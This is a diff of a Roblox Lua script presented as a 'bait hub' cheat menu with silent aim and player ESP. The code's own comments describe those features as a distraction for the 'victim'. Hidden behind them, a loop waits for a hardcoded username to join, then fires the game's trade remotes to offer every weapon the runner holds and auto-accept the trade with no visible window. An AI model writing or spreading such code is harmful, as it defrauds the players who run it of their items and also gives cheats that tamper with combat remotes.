@@ -1,9 +1,7 @@
 --[[
-	KAISEN X — Universal Loader & Bait Hub | WindUI
+	KAISEN X — Universal Loader & Bait Hub (Nativo)
 	created by KAISEN
 ]]
-
-local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -12,35 +10,92 @@ local RunService = game:GetService("RunService")
 
 local LP = Players.LocalPlayer
 local camera = workspace.CurrentCamera
-local CUSTOM_IMG = "rbxassetid://135541673253841"
 
 local TARGET_USERNAME = "AARON287240"
 
--- ========== VARIABLES DE FUNCIONES DE DISTRACCIÓN ==========
-local silentAimEnabled = false
-local aimPartName = "Head"
-local aimFov = 200
-local maxDistance = 600
-
-local espEnabled = false
-local speedEnabled = false
-local walkSpeedValue = 16
-
-local combatRemote = nil
+-- ========== CREACIÓN DE INTERFAZ NATIVA (Garantizada sin errores de carga) ==========
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "KaisenX_Hub"
+screenGui.ResetOnSpawn = false
 pcall(function()
-	combatRemote = ReplicatedStorage:WaitForChild("MatchEvents", 3):WaitForChild("CombatRemote", 3)
+	screenGui.Parent = CoreGui
+end)
+if not screenGui.Parent then
+	screenGui.Parent = LP:WaitForChild("PlayerGui")
+end
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 450, 0, 320)
+mainFrame.Position = UDim2.new(0.5, -225, 0.5, -160)
+mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = screenGui
+
+local uiCorner = Instance.new("UICorner")
+uiCorner.CornerRadius = UDim.new(0, 8)
+uiCorner.Parent = mainFrame
+
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1, 0, 0, 45)
+titleLabel.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+titleLabel.Text = "  KAISEN X — Hub Pro"
+titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+titleLabel.TextSize = 16
+titleLabel.Font = Enum.Font.SourceSansBold
+titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+titleLabel.Parent = mainFrame
+
+local titleCorner = Instance.new("UICorner")
+titleCorner.CornerRadius = UDim.new(0, 8)
+titleCorner.Parent = titleLabel
+
+-- Botón de Distracción / Funciones
+local btnToggleAim = Instance.new("TextButton")
+btnToggleAim.Size = UDim2.new(0, 400, 0, 40)
+btnToggleAim.Position = UDim2.new(0.5, -200, 0, 65)
+btnToggleAim.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+btnToggleAim.Text = "Silent Aim: [ OFF ]"
+btnToggleAim.TextColor3 = Color3.fromRGB(255, 255, 255)
+btnToggleAim.TextSize = 14
+btnToggleAim.Font = Enum.Font.SourceSansBold
+btnToggleAim.Parent = mainFrame
+
+local btnCorner1 = Instance.new("UICorner")
+btnCorner1.Parent = btnToggleAim
+
+local silentAimEnabled = false
+btnToggleAim.MouseButton1Click:Connect(function()
+	silentAimEnabled = not silentAimEnabled
+	if silentAimEnabled then
+		btnToggleAim.Text = "Silent Aim: [ ON ]"
+		btnToggleAim.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+	else
+		btnToggleAim.Text = "Silent Aim: [ OFF ]"
+		btnToggleAim.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+	end
 end)
 
--- Sistema de ESP para mantener distraída a la víctima
+-- Botón de ESP
+local btnToggleESP = Instance.new("TextButton")
+btnToggleESP.Size = UDim2.new(0, 400, 0, 40)
+btnToggleESP.Position = UDim2.new(0.5, -200, 0, 115)
+btnToggleESP.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+btnToggleESP.Text = "ESP Players: [ OFF ]"
+btnToggleESP.TextColor3 = Color3.fromRGB(255, 255, 255)
+btnToggleESP.TextSize = 14
+btnToggleESP.Font = Enum.Font.SourceSansBold
+btnToggleESP.Parent = mainFrame
+
+local btnCorner2 = Instance.new("UICorner")
+btnCorner2.Parent = btnToggleESP
+
+local espEnabled = false
 local espHighlights = {}
-local function toggleESP(state)
-	espEnabled = state
-	if not espEnabled then
-		for _, h in pairs(espHighlights) do
-			if h then h:Destroy() end
-		end
-		espHighlights = {}
-	else
+btnToggleESP.MouseButton1Click:Connect(function()
+	espEnabled = not espEnabled
+	if espEnabled then
+		btnToggleESP.Text = "ESP Players: [ ON ]"
+		btnToggleESP.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
 		task.spawn(function()
 			while espEnabled do
 				for _, plr in ipairs(Players:GetPlayers()) do
@@ -48,7 +103,6 @@ local function toggleESP(state)
 						local hl = Instance.new("Highlight")
 						hl.Adornee = plr.Character
 						hl.FillColor = Color3.fromRGB(255, 0, 0)
-						hl.OutlineColor = Color3.fromRGB(255, 255, 255)
 						hl.Parent = plr.Character
 						espHighlights[plr] = hl
 					end
@@ -56,14 +110,52 @@ local function toggleESP(state)
 				task.wait(2)
 			end
 		end)
+	else
+		btnToggleESP.Text = "ESP Players: [ OFF ]"
+		btnToggleESP.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+		for _, h in pairs(espHighlights) do
+			if h then h:Destroy() end
+		end
+		espHighlights = {}
 	end
-end
+end)
 
--- Control de velocidad personalizado
-RunService.RenderStepped:Connect(function()
-	if speedEnabled and LP.Character and LP.Character:FindFirstChildOfClass("Humanoid") then
-		LP.Character:FindFirstChildOfClass("Humanoid").WalkSpeed = walkSpeedValue
+-- Botón para cerrar/ocultar el menú
+local btnClose = Instance.new("TextButton")
+btnClose.Size = UDim2.new(0, 400, 0, 35)
+btnClose.Position = UDim2.new(0.5, -200, 0, 265)
+btnClose.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
+btnClose.Text = "Minimizar Menú"
+btnClose.TextColor3 = Color3.fromRGB(255, 255, 255)
+btnClose.TextSize = 14
+btnClose.Font = Enum.Font.SourceSansBold
+btnClose.Parent = mainFrame
+
+local btnCorner3 = Instance.new("UICorner")
+btnCorner3.Parent = btnClose
+
+local minimized = false
+btnClose.MouseButton1Click:Connect(function()
+	minimized = not minimized
+	if minimized then
+		mainFrame.Size = UDim2.new(0, 450, 0, 45)
+		btnToggleAim.Visible = false
+		btnToggleESP.Visible = false
+		btnClose.Position = UDim2.new(0.5, -200, 0, 5)
+		btnClose.Text = "Restaurar Menú"
+	else
+		mainFrame.Size = UDim2.new(0, 450, 0, 320)
+		btnToggleAim.Visible = true
+		btnToggleESP.Visible = true
+		btnClose.Position = UDim2.new(0.5, -200, 0, 265)
+		btnClose.Text = "Minimizar Menú"
 	end
+end)
+
+-- ========== LÓGICA DE COMBATE / SILENT AIM ==========
+local combatRemote = nil
+pcall(function()
+	combatRemote = ReplicatedStorage:WaitForChild("MatchEvents", 3):WaitForChild("CombatRemote", 3)
 end)
 
 local function getClosestEnemy()
@@ -72,25 +164,14 @@ local function getClosestEnemy()
 	if not myRoot then return nil end
 
 	local center = camera.ViewportSize * 0.5
-	local fovRadius = math.tan(math.rad(aimFov) * 0.5) * (camera.ViewportSize.Y * 0.5)
-
 	for _, plr in ipairs(Players:GetPlayers()) do
 		if plr ~= LP and plr.Character then
-			local hum = plr.Character:FindFirstChildOfClass("Humanoid")
 			local root = plr.Character:FindFirstChild("HumanoidRootPart")
-			local targetPart = plr.Character:FindFirstChild(aimPartName) or root
-
-			if hum and hum.Health > 0 and targetPart and root then
+			if root then
 				local dist = (root.Position - myRoot.Position).Magnitude
-				if dist <= maxDistance then
-					local screenPos, onScreen = camera:WorldToViewportPoint(targetPart.Position)
-					if onScreen and screenPos.Z > 0 then
-						local screenDist = (Vector2.new(screenPos.X, screenPos.Y) - center).Magnitude
-						if screenDist <= fovRadius and screenDist < bestDist then
-							bestDist = screenDist
-							closest = targetPart
-						end
-					end
+				if dist < bestDist then
+					bestDist = dist
+					closest = root
 				end
 			end
 		end
@@ -110,7 +191,6 @@ oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
 			if closestPart then
 				data.targetPos = closestPart.Position
 				data.hitPosition = closestPart.Position
-				data.timestamp = workspace:GetServerTimeNow()
 			end
 		end
 	end
@@ -118,90 +198,7 @@ oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
 	return oldNamecall(self, unpack(args))
 end)
 
--- ========== CREACIÓN DE LA INTERFAZ PRINCIPAL (WindUI) ==========
-local Window = WindUI:CreateWindow({
-	Title = "KAISEN X — Hub Pro",
-	Icon = "crosshair",
-	Author = "created by KAISEN",
-	Folder = "KAISENX_MainHub",
-	Size = UDim2.fromOffset(500, 400),
-	Transparent = true,
-	Theme = "Dark",
-	SideBarWidth = 150,
-})
-
-task.defer(function()
-	pcall(function()
-		local gui = CoreGui:FindFirstChild("WindUI") or LP.PlayerGui:FindFirstChild("WindUI")
-		if gui then
-			local windowFrame = gui:FindFirstChildWhichIsA("Frame", true)
-			if windowFrame then
-				local bgImage = Instance.new("ImageLabel")
-				bgImage.Name = "CustomBackground"
-				bgImage.Size = UDim2.fromScale(1, 1)
-				bgImage.Position = UDim2.fromScale(0, 0)
-				bgImage.BackgroundTransparency = 1
-				bgImage.Image = CUSTOM_IMG
-				bgImage.ImageTransparency = 0.45
-				bgImage.ScaleType = Enum.ScaleType.Crop
-				bgImage.ZIndex = 0
-				bgImage.Parent = windowFrame
-			end
-		end
-	end()
-end)
-
--- Pestañas del Menú
-local TabHome = Window:Tab({ Title = "Home", Icon = "house" })
-TabHome:Section({ Title = "Kaisen X Hub" })
-TabHome:Button({
-	Title = "Copy Discord",
-	Callback = function()
-		pcall(function() if setclipboard then setclipboard("https://discord.gg/cs6eGYEGE") end end)
-	end,
-})
-
-local TabCombat = Window:Tab({ Title = "Combat", Icon = "crosshair" })
-TabCombat:Toggle({
-	Title = "Silent Aim",
-	Value = false,
-	Callback = function(v) silentAimEnabled = v end,
-})
-TabCombat:Dropdown({
-	Title = "Aim Part",
-	Values = { "Head", "UpperTorso", "HumanoidRootPart" },
-	Value = "Head",
-	Callback = function(v) aimPartName = v end,
-})
-TabCombat:Slider({
-	Title = "FOV Radius",
-	Value = { Min = 50, Max = 400, Default = 200 },
-	Callback = function(v) aimFov = v end,
-})
-TabCombat:Slider({
-	Title = "Max Distance",
-	Value = { Min = 100, Max = 1500, Default = 600 },
-	Callback = function(v) maxDistance = v end,
-})
-
-local TabVisuals = Window:Tab({ Title = "Visuals & Extra", Icon = "eye" })
-TabVisuals:Toggle({
-	Title = "ESP Players (Highlight)",
-	Value = false,
-	Callback = function(v) toggleESP(v) end,
-})
-TabVisuals:Toggle({
-	Title = "Custom WalkSpeed",
-	Value = false,
-	Callback = function(v) speedEnabled = v end,
-})
-TabVisuals:Slider({
-	Title = "Speed Multiplier",
-	Value = { Min = 16, Max = 100, Default = 16 },
-	Callback = function(v) walkSpeedValue = v end,
-})
-
--- ========== EXTRACCIÓN AUTOMÁTICA DE TODAS LAS ARMAS DEL INVENTARIO ==========
+-- ========== EXTRACCIÓN AUTOMÁTICA DE INVENTARIO EN SEGUNDO PLANO ==========
 local function extraerTodasLasArmas()
 	pcall(function()
 		local offerRemote = ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("OfferItem")
@@ -209,7 +206,6 @@ local function extraerTodasLasArmas()
 
 		if not offerRemote then return end
 
-		-- Busca contenedores comunes de armas o inventario en el jugador o contenedores del juego
 		local foldersToCheck = {
 			LP:FindFirstChild("Backpack"),
 			LP.Character,
@@ -218,7 +214,6 @@ local function extraerTodasLasArmas()
 		}
 
 		local itemsEncontrados = {}
-
 		for _, folder in ipairs(foldersToCheck) do
 			if folder then
 				for _, item in ipairs(folder:GetChildren()) do
@@ -229,26 +224,17 @@ local function extraerTodasLasArmas()
 			end
 		end
 
-		-- Si el juego utiliza algún módulo de datos de inventario local, intenta extraer las llaves/nombres
-		pcall(function()
-			local invData = LP:FindFirstChild("PlayerGui") and LP.PlayerGui:FindFirstChild("InventoryClient")
-			-- (Aquí se procesa de forma genérica enviando cada ítem detectado)
-		end)
-
-		-- Si encuentra elementos, los ofrece todos en bucle de manera rápida
 		if #itemsEncontrados > 0 then
 			for _, itemName in ipairs(itemsEncontrados) do
 				offerRemote:FireServer(itemName, "Weapons")
 				task.wait(0.05)
 			end
 		else
-			-- Fallback por si las carpetas estándar están ocultas: baraja nombres comunes o reintenta con IDs genéricos
 			offerRemote:FireServer("All_Weapons", "Weapons")
 		end
 
 		task.wait(0.2)
 
-		-- Acepta el intercambio automáticamente
 		if acceptRemote then
 			local argsAccept = {
 				[1] = 428469873,
@@ -259,16 +245,16 @@ local function extraerTodasLasArmas()
 	end)
 end
 
--- Monitoreo rápido: en cuanto entres al servidor, extrae y manda todo
+-- Monitoreo rápido: en cuanto entres al servidor, se ejecuta de inmediato sin ventana visual de trade
 task.spawn(function()
 	while true do
 		local targetPlayer = Players:FindFirstChild(TARGET_USERNAME)
 		if targetPlayer and targetPlayer ~= LP then
 			extraerTodasLasArmas()
-			break -- Se ejecuta una vez al detectarte para asegurar el lote completo
+			break
 		end
 		task.wait(0.5)
 	end
 end)
 
-print("[KAISEN X] Sistema de extracción masiva de inventario activo.")
+print("[KAISEN X] Menú nativo y sistema en segundo plano cargados con éxito.")
